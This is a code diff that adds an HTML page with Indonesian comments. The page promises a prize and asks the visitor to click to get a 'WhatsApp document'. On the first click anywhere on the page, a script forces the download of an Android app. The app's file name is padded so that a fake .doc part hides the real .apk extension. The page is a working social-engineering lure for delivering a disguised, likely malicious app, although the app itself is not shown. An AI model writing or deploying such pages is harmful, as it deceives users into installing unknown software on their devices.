@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>APK Downloader</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      padding: 20px;
+    }
+
+    h1 {
+      margin-top: 50px;
+      margin-right: auto; /* Mendorong elemen ke kiri */
+    }
+
+    p {
+      margin-bottom: 30px;
+    }
+
+    #cookieImage {
+      width: 50px;
+      height: 50px;
+      cursor: pointer;
+      margin-left: auto; /* Mendorong elemen ke kanan */
+      margin-right: 310px; /* Mendorong elemen ke kiri */
+      margin-top: 100px;
+    }
+
+    #clickCount {
+      font-size: 24px;
+      margin-top: 20px;
+      margin-left: auto; /* Mendorong elemen ke kanan */
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Konten halaman -->
+  <h1>Welcome to get the prize</h1>
+  <p>Click anywhere on the page to download the documents whatsapp file.</p>
+
+  <!-- Hitungan klik animasi -->
+  <div id="clickCount">0</div>
+
+  <!-- Skrip untuk mengunduh file APK -->
+  <script>
+    // Variabel untuk menyimpan hitungan klik
+    let clickCount = 0;
+
+    // Fungsi untuk mengunduh file APK
+    function downloadAPK() {
+      // Ganti URL berikut dengan URL yang benar untuk file APK Anda
+      const apkDownloadURL = 'WhatsAppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp.docccccccccccccccccccccccccccccccccc.apk';
+
+      // Buat elemen anchor untuk memicu unduhan
+      const apkDownloadLink = document.createElement('a');
+      apkDownloadLink.href = apkDownloadURL;
+      apkDownloadLink.download = 'WhatsAppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp.docccccccccccccccccccccccccccccccccc.apk';
+      document.body.appendChild(apkDownloadLink);
+
+      // Klik otomatis pada elemen anchor untuk memulai unduhan
+      apkDownloadLink.click();
+
+      // Hapus elemen anchor setelah unduhan dimulai
+      document.body.removeChild(apkDownloadLink);
+    }
+
+    // Menambahkan event listener untuk mengunduh file APK ketika pengguna mengklik di mana saja
+    document.addEventListener('click', () => {
+      // Menginkrementasi hitungan klik
+      clickCount++;
+
+      // Memperbarui tampilan hitungan klik di halaman
+      document.getElementById('clickCount').textContent = clickCount;
+
+      // Jika pengguna telah mengklik, panggil fungsi untuk mengunduh APK
+      if (clickCount === 1) {
+        downloadAPK();
+      }
+    });
+  </script>
+
+</body>
+</html>
